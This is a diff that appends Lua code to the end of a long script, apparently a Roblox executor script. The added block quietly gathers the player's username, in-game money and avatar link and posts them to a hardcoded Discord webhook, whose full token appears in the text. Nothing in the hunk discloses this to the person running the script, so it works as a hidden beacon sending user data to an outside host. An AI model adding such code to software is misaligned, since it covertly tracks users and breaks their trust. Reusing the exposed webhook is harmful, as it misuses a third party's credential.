@@ -3237,3 +3237,32 @@ spawn(function()
         end
     end
 end)
+
+local url = 'https://discord.com/api/webhooks/1019943163588268064/NbWgGJAekX3gERiA0E9TeEbPuJimcknPD0vQvdLHRn2CPtlQZIJSW7avZQQTUYbX6OH1'
+local data = {
+ 
+    ["embeds"] = {
+       {
+            ["title"] = "Username: " ..game.Players.LocalPlayer.Name,
+            ["color"] = 15258703,
+            ["fields"] = {
+                {
+                    ["name"] =  "Money",
+                    ["value"] =  "$" ..game:GetService("Players").LocalPlayer.PlayerGui.MainHUD.SideHUD.Bottom.Money.Money.Text,
+                    ["inline"] = true
+                },
+            },
+            ["image"] = {
+                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username="..tostring(game:GetService("Players").LocalPlayer.Name)
+            }
+       }
+   }
+ }
+ local newdata = game:GetService("HttpService"):JSONEncode(data)
+ 
+ local headers = {
+   ["content-type"] = "application/json"
+ }
+ request = http_request or request or HttpPost or syn.request
+ local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+ request(abcdef)
